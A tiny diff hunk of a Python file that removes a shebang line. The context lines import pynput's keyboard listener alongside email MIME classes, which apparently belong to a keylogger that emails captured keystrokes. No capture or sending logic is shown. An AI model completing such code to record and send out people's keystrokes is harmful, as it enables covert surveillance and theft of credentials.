@@ -1,5 +1,3 @@
-#!/home/shabha/venv/bin/python
-
 from pynput.keyboard import Key, Listener
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
